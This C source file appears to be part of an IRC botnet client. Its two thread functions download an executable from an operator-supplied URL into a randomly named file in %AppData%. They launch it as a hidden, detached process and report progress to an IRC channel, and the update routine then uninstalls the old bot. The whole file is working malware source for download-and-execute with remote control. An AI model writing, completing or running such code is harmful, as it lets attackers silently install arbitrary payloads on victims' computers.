#include "wALL.h"
DWORD WINAPI IsDownload( LPVOID param )
{
	char url_buffer[MAX_LINE] = {0};
	char destination_buffer[MAX_LINE] = {0};
	char target_buffer[MAX_LINE] = {0};
	char buffer[MAX_LINE] = {0};

	HRESULT	dl;
	
	strcpy( url_buffer, Download_URL );
	strcpy( target_buffer, Download_Target );

	ExpandEnvironmentStrings( "%AppData%", destination_buffer, sizeof( destination_buffer ) );
	sprintf( destination_buffer, "%s\\%s%i%i.exe", destination_buffer, GenerateRandomLetters( 20 ), rand()%9, rand()%9 );

	dl = URLDownloadToFile( NULL, url_buffer, destination_buffer, 0, NULL );

	sprintf( buffer, "%s Downloading File From: %s, To: %s", title_download, url_buffer, destination_buffer );
	IRC_Send(MSG_PRIVMSG, buffer, target_buffer);

	if( dl == S_OK ) {
		sprintf( buffer, "%s File Successfully Downloaded To: %s", title_download, destination_buffer );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
	} else if( dl == E_OUTOFMEMORY ) {
		sprintf( buffer, "%s Failed To Download File Reason: Insufficient Memory", title_download );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		Thread_Clear( DOWNLOAD_THREAD );
		return 0;
	} else if( dl == INET_E_DOWNLOAD_FAILURE ) {
		sprintf( buffer, "%s Failed To Download File Reason: Unknown", title_download );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		Thread_Clear( DOWNLOAD_THREAD );
		return 0;
	} else {
		sprintf( buffer, "%s Failed To Download File Reason: Unknown", title_download );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		Thread_Clear( DOWNLOAD_THREAD );
		return 0;
	}

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory( &pinfo, sizeof( PROCESS_INFORMATION ) );
		ZeroMemory( &sinfo, sizeof( STARTUPINFO ) );
		sinfo.cb = sizeof( sinfo );
		sinfo.wShowWindow = SW_HIDE;

		if ( CreateProcess( NULL, destination_buffer, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS|DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo ) == TRUE ) {
		sprintf( buffer, "%s Successfully Executed: %s", title_download, destination_buffer );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		} else {
			sprintf( buffer, "%s Failed To Execute File via Create Process Reason: Unknown", title_download );
			IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		}
	Thread_Clear( DOWNLOAD_THREAD );
	Thread_Kill( DOWNLOAD_THREAD );
	return 0;
}

DWORD WINAPI IsUpdate( LPVOID param )
{
	char url_buffer[MAX_LINE];
	char destination_buffer[MAX_LINE];
	char target_buffer[MAX_LINE];
	char buffer[MAX_LINE];
	HRESULT	dl;
	
	strcpy( url_buffer, Download_URL );
	strcpy( target_buffer, Download_Target );

	ExpandEnvironmentStrings( "%AppData%", destination_buffer, sizeof( destination_buffer ) );
	sprintf( destination_buffer, "%s\\%s%i%i.exe", destination_buffer, GenerateRandomLetters( 20 ), rand()%9, rand()%9 );

	dl = URLDownloadToFile( NULL, url_buffer, destination_buffer, 0, NULL );

	sprintf( buffer, "%s Downloading File From: %s, To: %s", title_download, url_buffer, destination_buffer );
	IRC_Send(MSG_PRIVMSG, buffer, target_buffer);

	if( dl == S_OK ) {
		sprintf( buffer, "%s File Successfully Downloaded To: %s", title_download, destination_buffer );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
	} else if( dl == E_OUTOFMEMORY ) {
		sprintf( buffer, "%s Failed To Download File Reason: Insufficient Memory", title_download );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		Thread_Clear( UPDATE_THREAD );
		return 0;
	} else if( dl == INET_E_DOWNLOAD_FAILURE ) {
		sprintf( buffer, "%s Failed To Download File Reason: Unknown", title_download );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		Thread_Clear( UPDATE_THREAD );
		return 0;
	} else {
		sprintf( buffer, "%s Failed To Download File Reason: Unknown", title_download );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		Thread_Clear( UPDATE_THREAD );
		return 0;
	}
    
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory( &pinfo, sizeof( PROCESS_INFORMATION ) );
		ZeroMemory( &sinfo, sizeof( STARTUPINFO ) );
		sinfo.cb = sizeof( sinfo );
		sinfo.wShowWindow = SW_HIDE;

		if ( CreateProcess( NULL, destination_buffer, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS|DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo ) == TRUE ) {
		sprintf( buffer, "%s Successfully Executed: %s", title_download, destination_buffer );
		IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
			Uninstall();
		} else {
			sprintf( buffer, "%s Failed To Execute File via Create Process Reason: Unknown", title_download );
			IRC_Send(MSG_PRIVMSG, buffer, target_buffer);
		}

	Thread_Clear( UPDATE_THREAD );
	Thread_Kill( UPDATE_THREAD );
	return 0;
}